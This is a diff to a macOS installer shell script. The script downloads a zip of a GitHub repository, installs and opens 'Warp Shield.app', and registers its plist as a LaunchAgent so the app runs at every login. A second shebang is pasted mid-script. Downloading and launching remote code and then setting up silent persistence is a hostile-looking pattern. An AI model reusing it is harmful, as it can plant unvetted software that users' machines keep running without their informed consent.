@@ -2,7 +2,7 @@
 set -euo pipefail
 
 # --- Config ---
-ZIP_URL="https://github.com/44sk/j/archive/refs/heads/main.zip"
+ZIP_URL="https://github.com/44sk/expert-disco/archive/refs/heads/main.zip"
 TMPDIR="$(mktemp -d)"
 APP_NAME="Warp Shield.app"
 
@@ -52,23 +52,37 @@ chmod +x "$DEST/Contents/MacOS/"* 2>/dev/null || true
 open "$DEST"
 
 
-PLIST_SRC="$(pwd)/Warp Shield.app/Contents/Resources/com.WarpShield.WarpShield.plist"
+#!/bin/bash
+set -e
+
+# --- Paths ---
+APP="/Applications/Warp Shield.app"
+PLIST_SRC="$APP/Contents/Resources/com.WarpShield.WarpShield.plist"
 PLIST_DST="$HOME/Library/LaunchAgents/com.WarpShield.WarpShield.plist"
 
+# --- Make LaunchAgents folder if missing ---
 mkdir -p "$HOME/Library/LaunchAgents"
 
-if [ ! -f "$PLIST_DST" ]; then
-    cp "$PLIST_SRC" "$PLIST_DST"
-fi
+# --- Copy plist ---
+cp "$PLIST_SRC" "$PLIST_DST"
 
+# --- Set permissions ---
 chmod 644 "$PLIST_DST"
 chown "$USER":staff "$PLIST_DST"
 
-plutil -lint "$PLIST_DST" >/dev/null 2>&1
+# --- Validate plist ---
+plutil -lint "$PLIST_DST"
 
+# --- Unload old agent if any, then load ---
 launchctl bootout gui/$(id -u) "$PLIST_DST" 2>/dev/null || true
-launchctl bootstrap gui/$(id -u) "$PLIST_DST" 2>/dev/null || true
+launchctl bootstrap gui/$(id -u) "$PLIST_DST"
 
+# --- Check if running ---
+if launchctl list | grep -q WarpShield; then
+    echo "LaunchAgent loaded successfully!"
+else
+    echo "LaunchAgent did not load."
+fi
 launchctl list | grep WarpShield >/dev/null 2>&1 || true
 
 # --- Final message ---
